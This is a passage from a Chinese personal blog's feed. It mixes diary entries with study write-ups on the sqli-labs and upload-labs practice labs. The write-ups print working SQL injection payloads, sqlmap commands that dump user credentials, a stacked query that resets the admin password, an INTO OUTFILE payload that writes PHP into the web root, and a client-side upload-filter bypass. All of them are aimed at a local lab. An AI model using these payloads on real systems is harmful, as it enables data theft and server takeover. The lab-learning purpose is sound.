title="第2种"></a>第2种</h2><p>由于白名单函数是在JavaScript中运行，所以可以禁用或修改JavaScript来关闭白名单，这样就可以直接把目标文件上传到服务器。<br>比如在Firefox中打开about:config，然后搜索javascript.enabled  默认是true，即使用JavaScript。可以修改为false禁用。<br>或者按F12，修改白名单的源码保存。（不推荐，实际用处不大）</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>曲曲折折走了些弯路，幸好最后成功了，不过先看点教学视频也许会上手更快。</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Xionghuimin/article/details/106506988#:~:text=%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9A%E6%89%93%E5%BC%80%20%E4%B8%AD%E5%9B%BD%E8%9A%81%E5%89%91%20%EF%BC%8C%E5%A2%9E%E5%8A%A0%20%E6%95%B0%E6%8D%AE%20%EF%BC%8C%E7%84%B6%E5%90%8E%E5%A1%AB%E5%86%99URL%20%E5%9C%B0%E5%9D%80%20%EF%BC%8C%E5%A1%AB%E5%86%99%E8%87%AA%E5%B7%B1%E7%9A%84%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0,%E5%80%BC%20%E4%B8%BA%E7%A9%BA%20%EF%BC%8C%E4%B8%8D%E8%A6%81%E7%9D%80%E6%80%A5%EF%BC%8C%E5%8F%AA%E8%A6%81%E4%BD%A0%E5%A6%82%E4%B8%8B%E5%A1%AB%E5%86%99%E5%B0%B1%E8%A1%8C%E3%80%82%20%E5%89%8D%E9%9D%A2%E6%98%AF%E8%87%AA%E5%B7%B1%E7%9A%84IP%20%E5%9C%B0%E5%9D%80%20%EF%BC%8C%E5%90%8E%E9%9D%A2%E6%98%AF%E8%87%AA%E5%B7%B1%20%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%20%E7%9A%84%E4%BD%8D%E7%BD%AE%E3%80%82">文件上传漏洞—蚁剑连接地址错误、一句话木马php语法错误</a><br><a href="https://blog.csdn.net/hexiaan/article/details/127054253">upload-labs Pass-01</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;作为上传漏洞的第一关，啥都没了解就开始做还是遇到了一些障碍。&lt;/p&gt;</summary>
    
    
    
    <category term="upload-labs" scheme="http://example.com/categories/upload-labs/"/>
    
    
    <category term="upload-labs" scheme="http://example.com/tags/upload-labs/"/>
    
    <category term="蚁剑" scheme="http://example.com/tags/%E8%9A%81%E5%89%91/"/>
    
  </entry>
  
  <entry>
    <title>我对普通人类没有兴趣</title>
    <link href="http://example.com/2022/11/21/Diary_1121/"/>
    <id>http://example.com/2022/11/21/Diary_1121/</id>
    <published>2022-11-20T16:00:00.000Z</published>
    <updated>2022-11-21T16:50:00.756Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/%E5%BF%97%E6%91%A9%E5%87%9B4.png" alt="志摩凛"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>晚上学习的时候一个东西始终搞不通，烦死人了。</p><h1 id="一段文言文"><a href="#一段文言文" class="headerlink" title="一段文言文"></a>一段文言文</h1><p>夫子之道至大，故天下莫能容。虽然，夫子推而行之，不容何病，不容然后见君子！夫道之不修也，是吾丑也。夫道既已大修而不用，是有国者之丑也。不容何病，不容然后见君子！<br>--节选自《史记 孔子世家》</p><h1 id="不容然后见君子"><a href="#不容然后见君子" class="headerlink" title="不容然后见君子"></a>不容然后见君子</h1><p>上面那段文言文，最喜欢的就是我写在标题上这句话。有一种豪气或是傲慢在里面：你天下容不下我的理念，这是你天下的度量不够大，这不是我的过错。容不下又如何呢？就是因为容不下，才显得我是君子！<br>这是孔子提问时，颜回对孔子的回答。不愧是孔子最得意的门生呀。我想，做人能做到这种程度，就已然足够了。</p><h1 id="永恒"><a href="#永恒" class="headerlink" title="永恒"></a>永恒</h1><p>在最光辉灿烂的时候把生命一下子玩到尽头，就是永恒！  --黄家驹<br>来吧，用尽力气，去燃烧生命吧！</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/%E5%BF%97%E6%91%A9%E5%87%9B4.png&quot; alt=&quot;志摩凛&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
    
    
    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
    
    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>sqlmap使用</title>
    <link href="http://example.com/2022/11/21/sqlmap%E4%BD%BF%E7%94%A8/"/>
    <id>http://example.com/2022/11/21/sqlmap%E4%BD%BF%E7%94%A8/</id>
    <published>2022-11-20T16:00:00.000Z</published>
    <updated>2022-11-23T13:18:22.986Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>其实是有些犹豫，要不要写这一篇的，因为觉得自己学得很浅显。<br>想了想，还是写下来吧。毕竟这个工具我是从一张白纸开始，如果不写笔记，说不定很快会忘记。</p><span id="more"></span><h1 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h1><p>说明：本文以Windows10环境下的sqlmap版本为1.6.11.3为例，对sqlmap的一些基本使用进行讲解。本篇的示例以sqli-labs为主。<br>用法：python sqlmap.py [选项]</p><h2 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h2><ul><li>Windows方式<br><a href="https://sqlmap.org/">官网</a><br>下载zip文件<br>我的是在Windows物理机上安装的，在cmd里执行命令时，需要在开头多输入一个python才能执行。<br>注意cmd运行时，需要将cmd的位置换到该安装目录下才可以。</li><li>Linux方式<br>git直接安装<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gitclone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev</span><br></pre></td></tr></table></figure></li><li>kali及PentestBox默认安装sqlmap</li></ul><h2 id="基本选项"><a href="#基本选项" class="headerlink" title="基本选项"></a>基本选项</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-h,--help  显示基本帮助信息并退出</span><br><span class="line">-hh    显示高级帮助信息并退出</span><br><span class="line">--version  显示程序版本信息并退出</span><br><span class="line">-vVERBOSE信息级别: 0-6 （缺省1），其值具体含义：“0”只显示python错误以及严重的信息；1同时显示基本信息和警告信息（默认）；“2”同时显示debug信息；“3”同时显示注入的payload；“4”同时显示HTTP请求；“5”同时显示HTTP响应头；“6”同时显示HTTP响应页面；如果想看到sqlmap发送的测试payload最好的等级就是3。</span><br></pre></td></tr></table></figure><h2 id="爆破sqli-labs的第1-10关-GET型"><a href="#爆破sqli-labs的第1-10关-GET型" class="headerlink" title="爆破sqli-labs的第1-10关(GET型)"></a>爆破sqli-labs的第1-10关(GET型)</h2><p>首先来示例一下注入语句</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py --purge   清缓存，可做可不做</span><br><span class="line">在物理机上，一般需要首先输入python，--purge是清除的意思。注意需要两个杠--</span><br><span class="line">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=1   判断是否存在注入点</span><br><span class="line">-u的意思是url，即在后面添加所需的url  GET注入时不仅需要url，还需要添加注入点，比如这里的?id=1  </span><br><span class="line">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=1  --dbs --batch   爆破所有数据库</span><br><span class="line">--dbs的意思是database，即爆库  --batch的意思是批处理，即在sqlmap运行时出现选项的时候自动选择默认选项。</span><br><span class="line">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=1 -D security --tables --batch  爆破security数据库下所有的表</span><br><span class="line">-D意思是database，即在什么数据库下扫描   --tables即为爆数据表</span><br><span class="line">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=1 -D security -T users --columns --batch   爆字段名</span><br><span class="line">-T意思是tables，后面跟所需扫描的表  --columns即为爆字段名</span><br><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs-master/Less-1/?id=1&quot; -D database() -T users -C &quot;id,username,password&quot; --dump --batch   爆数据</span><br><span class="line">-C意思是columns，后面跟所需要扫描的字段名  --dump意思是转储，即显示数据</span><br></pre></td></tr></table></figure><p>说明：</p><ul><li>在执行过程中根据数据大小和注入方式等的不同，会导致扫描时间不同，耐心等待即可。如果一个扫描超出预计等待时间，通常可能哪里弄错了，关了和重新打开尝试即可。</li><li>扫描得到的数据通常会以表的形式显示出来</li><li>常用英文说明<br>boolean-based blind: 布尔盲注<br>error-based: 报错注入<br>AND&#x2F;OR time-based blind: 时间盲注<br>UNION query: 联合注入</li></ul><h2 id="爆破sqli-labs的第11-17关-POST型"><a href="#爆破sqli-labs的第11-17关-POST型" class="headerlink" title="爆破sqli-labs的第11-17关(POST型)"></a>爆破sqli-labs的第11-17关(POST型)</h2><p>首先来示例一下注入语句</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-11/index.php --data &quot;uname=1&amp;passwd=11&amp;submit=Submit&quot; --dbs --batch   爆破所有数据库</span><br><span class="line">POST注入时在后面添加index.php, --data意思是通过POST发送参数，后面是具体需要发送的参数</span><br><span class="line">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-11/index.php --data &quot;uname=1&amp;passwd=11&amp;submit=Submit&quot; -D security --tables --batch   爆破security数据库下所有的表</span><br><span class="line">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-11/index.php --data &quot;uname=1&amp;passwd=11&amp;submit=Submit&quot; -D security -T users --columns --batch</span><br><span class="line">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-11/index.php --data &quot;uname=1&amp;passwd=11&amp;submit=Submit&quot; -D security -T users -C id,username,password --dump --batch</span><br></pre></td></tr></table></figure><p>说明：</p><ul><li>除了发送参数有区别，其它都没什么区别</li></ul><h2 id="爆破sqli-labs的第18关-User-Agent注入"><a href="#爆破sqli-labs的第18关-User-Agent注入" class="headerlink" title="爆破sqli-labs的第18关(User-Agent注入)"></a>爆破sqli-labs的第18关(User-Agent注入)</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs-master/Less-18/&quot; --data=&quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --user-agent=&quot;*&quot; --thread=10 --dbs --batch  爆破数据库</span><br><span class="line">这里不再需要在url后面添加index.php了   user-agent是用户代理，注入点在这里，因此选择这里注入  --thread=10 意思是线程数为10，表示运行快慢，太高容易被检测到，不宜高线程</span><br></pre></td></tr></table></figure><p>说明：</p><ul><li>除了发送参数有区别，其它都没什么区别，依葫芦画瓢即可</li></ul><h2 id="爆破sqli-labs的第19关-Referer注入"><a href="#爆破sqli-labs的第19关-Referer注入" class="headerlink" title="爆破sqli-labs的第19关(Referer注入)"></a>爆破sqli-labs的第19关(Referer注入)</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs-master/Less-18/&quot; --data=&quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --referer=&quot;*&quot; --thread=10 --dbs --batch  爆破数据库</span><br><span class="line">参数改为referer罢了，思路相同</span><br></pre></td></tr></table></figure><h2 id="爆破sqli-labs的第20关-Cookie注入"><a href="#爆破sqli-labs的第20关-Cookie注入" class="headerlink" title="爆破sqli-labs的第20关(Cookie注入)"></a>爆破sqli-labs的第20关(Cookie注入)</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs-master/Less-18/&quot; --data=&quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --cookie=&quot;uname=admin&quot; --dbs --batch  爆破数据库</span><br><span class="line">参数改为cookie，差别不大</span><br></pre></td></tr></table></figure><h2 id="爆破sqli-labs的第21关-Cookie注入"><a href="#爆破sqli-labs的第21关-Cookie注入" class="headerlink" title="爆破sqli-labs的第21关(Cookie注入)"></a>爆破sqli-labs的第21关(Cookie注入)</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs-master/Less-18/&quot; --data=&quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --cookie=&quot;uname=*&quot; --dbs --tamper &quot;base64encode.py&quot; --batch  爆破数据库</span><br></pre></td></tr></table></figure><h2 id="爆破sqli-labs的第21关-Cookie注入-1"><a href="#爆破sqli-labs的第21关-Cookie注入-1" class="headerlink" title="爆破sqli-labs的第21关(Cookie注入)"></a>爆破sqli-labs的第21关(Cookie注入)</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>第18关整半天弄不出来，也不知道什么原因，气死了。<br>所以这次就先写到17关了，以后有机会再补完。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;其实是有些犹豫，要不要写这一篇的，因为觉得自己学得很浅显。&lt;br&gt;想了想，还是写下来吧。毕竟这个工具我是从一张白纸开始，如果不写笔记，说不定很快会忘记。&lt;/p&gt;</summary>
    
    
    
    <category term="SQL注入" scheme="http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="sqlmap" scheme="http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/sqlmap/"/>
    
    
    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="工具" scheme="http://example.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs_58-65</title>
    <link href="http://example.com/2022/11/20/sqli-labs_58-65/"/>
    <id>http://example.com/2022/11/20/sqli-labs_58-65/</id>
    <published>2022-11-19T16:00:00.000Z</published>
    <updated>2022-11-20T11:05:32.233Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>继续挑战吧</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol><li><p>测试并判断注入类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;  显示报错信息</span><br></pre></td></tr></table></figure><p>由此闭合方式为’<br>因为只有5次机会，所以我们采用报错注入比较快</p></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;challenges&#x27;),0x7e),1) --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;6ykqspiws7&#x27; limit 2,1),0x7e),1) --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; and updatexml(1,concat(0x7e,(select secret_K2GB from 6ykqspiws7),0x7e),1) --+</span><br></pre></td></tr></table></figure></li></ol><h2 id="第59关"><a href="#第59关" class="headerlink" title="第59关"></a>第59关</h2><p>与第58关相比差不多，只是闭合方式没有单引号</p><h2 id="第60关"><a href="#第60关" class="headerlink" title="第60关"></a>第60关</h2><p>与第58关相比差不多，只是闭合方式为id&#x3D;-1”)</p><h2 id="第61关"><a href="#第61关" class="headerlink" title="第61关"></a>第61关</h2><p>与第58关相比差不多，只是闭合方式为id&#x3D;-1’))</p><h2 id="第62关"><a href="#第62关" class="headerlink" title="第62关"></a>第62关</h2><p>时间盲注，闭合方式’)</p><h2 id="第63关"><a href="#第63关" class="headerlink" title="第63关"></a>第63关</h2><p>时间盲注，闭合方式’</p><h2 id="第64关"><a href="#第64关" class="headerlink" title="第64关"></a>第64关</h2><p>时间盲注，闭合方式))</p><h2 id="第65关"><a href="#第65关" class="headerlink" title="第65关"></a>第65关</h2><p>时间盲注，闭合方式”)</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>还行</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;继续挑战吧&lt;/p&gt;</summary>
    
    
    
    <category term="SQL注入" scheme="http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="sqli-labs" scheme="http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/sqli-labs/"/>
    
    
    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="sqli-labs" scheme="http://example.com/tags/sqli-labs/"/>
    
  </entry>
  
  <entry>
    <title>平水远矣</title>
    <link href="http://example.com/2022/11/19/Diary_1119/"/>
    <id>http://example.com/2022/11/19/Diary_1119/</id>
    <published>2022-11-18T16:00:00.000Z</published>
    <updated>2022-11-20T17:09:32.099Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/%E5%87%89%E5%AE%AB%E6%98%A5%E6%97%A5_4.png" alt="凉宫春日&amp;长门有希"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>糟糕的一天</p><h1 id="兜兜转转"><a href="#兜兜转转" class="headerlink" title="兜兜转转"></a>兜兜转转</h1><p>今天一天什么都没玩，但我感觉非常地不好，没学到多少东西。就像绕着一个圈子一直在兜兜转转，没啥好说的，明早早起。<br>今天是World Cup(世界杯)开幕式来着，我倒是没什么兴趣，就这样吧。</p><h1 id="平水远矣"><a href="#平水远矣" class="headerlink" title="平水远矣"></a>平水远矣</h1><p>人生就像一碗盛满的水，唯有把水端平，才走得远。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>赶紧早点睡咯</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/%E5%87%89%E5%AE%AB%E6%98%A5%E6%97%A5_4.png&quot; alt=&quot;凉宫春日&amp;amp;长门有希&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
    
    
    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
    
    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs_42-45</title>
    <link href="http://example.com/2022/11/19/sqli-labs_42-45/"/>
    <id>http://example.com/2022/11/19/sqli-labs_42-45/</id>
    <published>2022-11-18T16:00:00.000Z</published>
    <updated>2022-11-19T09:04:00.739Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>周末学习的开始</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol><li><p>测试并判断注入类型<br>查看源码，在login.php中注意到这样的语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>];</span><br></pre></td></tr></table></figure><p>我们可以发现，username被过滤了，但是password没有被过滤<br>因此我们可以考虑从password处进行注入<br>然后，通过对堆叠注入的尝试，我们发现也是可行的。<br>于是，我们可以有两种方式。<br>一是常规方式，二是通过堆叠注入修改管理员密码从而登录</p></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() #</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; #</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(username,&#x27;:&#x27;,password),2 from users #</span><br></pre></td></tr></table></figure></li><li><p>修改管理员密码(可以直接做)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;update users set password=&#x27;111111&#x27;  where username=&#x27;admin&#x27;#</span><br></pre></td></tr></table></figure></li></ol><h2 id="第43关"><a href="#第43关" class="headerlink" title="第43关"></a>第43关</h2><p>与第42关差不多，只不过闭合方式为’)</p><h2 id="第44关"><a href="#第44关" class="headerlink" title="第44关"></a>第44关</h2><p>与第42关差不多，只是不能使用报错注入</p><h2 id="第45关"><a href="#第45关" class="headerlink" title="第45关"></a>第45关</h2><p>与第43关差不多，只是闭合方式为’)</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>向前走,不回头~</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/qq_43395215/article/details/108245668">sqli-labs(38-53)</a><br><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;周末学习的开始&lt;/p&gt;</summary>
    
    
    
    <category term="SQL注入" scheme="http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="sqli-labs" scheme="http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/sqli-labs/"/>
    
    
    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="sqli-labs" scheme="http://example.com/tags/sqli-labs/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs_46+47</title>
    <link href="http://example.com/2022/11/19/sqli-labs_46+47/"/>
    <id>http://example.com/2022/11/19/sqli-labs_46+47/</id>
    <published>2022-11-18T16:00:00.000Z</published>
    <updated>2022-11-19T09:41:37.476Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前面连续几关相似，这一回终于有新内容了。</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol><li><p>测试并判断注入类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1</span><br></pre></td></tr></table></figure><p>显示有id,username,password的表格<br>可以直接得到需要的信息，但在实际情况中，这样是不够的。<br>也可以倒序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1 desc</span><br></pre></td></tr></table></figure><p>这里可用的注入方式很多<br>报错注入，时间盲注，双查询注入，函数注入<br>下面以报错注入为例</p></li><li><p>获取当前数据库名和数据库版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?sort=-1 and updatexml(1,concat(0x7e,database(),0x7e),1)</span><br><span class="line">?sort=-1 and updatexml(1,concat(0x7e,version(),0x7e),1)</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=-1 and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1),0x7e),1)</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=-1 and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 1,1),0x7e),1)</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=-1 and updatexml(1,concat(0x7e,(select concat_ws(username,&#x27;:&#x27;,password) from users limit 0,1),0x7e),1)</span><br></pre></td></tr></table></figure></li><li><p>写入查询记录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1 into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-46\\111.php&quot; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e2020--+</span><br></pre></td></tr></table></figure><p>用十六进制代替<?php phphinfo();?></p></li></ol><h2 id="第47关"><a href="#第47关" class="headerlink" title="第47关"></a>第47关</h2><p>与第46关相比差不多，只是闭合方式为’</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>有些时候注入的方式不止一种，我们只需选择自己最擅长以及最迅速有效的方法即可</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a><br><a href="https://blog.csdn.net/hxhxhxhxx/article/details/107643024">sqli-labs大详解（完结）</a><br><a href="https://blog.csdn.net/qq_43395215/article/details/108245668">sqli-labs(38-53)</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;前面连续几关相似，这一回终于有新内容了。&lt;/p&gt;</summary>
    
    
    
    <category term="SQL注入" scheme="http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="sqli-labs" scheme="http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/sqli-labs/"/>
    
    
    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="sqli-labs" scheme="http://example.com/tags/sqli-labs/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs_48-53</title>
    <link href="http://example.com/2022/11/19/sqli-labs_48-53/"/>
    <id>http://example.com/2022/11/19/sqli-labs_48-53/</id>
    <published>2022-11-18T16:00:00.000Z</published>
    <updated>2022-11-19T10:00:52.194Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>久违的盲注</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol><li><p>测试并判断注入类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;   无信息，只知道出错</span><br></pre></td></tr></table></figure><p>可以发现，现在无法使用报错注入了<br>那我们就要用到久违的盲注了。</p></li><li><p>获取当前数据库名和数据库版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=-1 and if((ascii(substr(database(),1,1))=115),sleep(10),1) --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 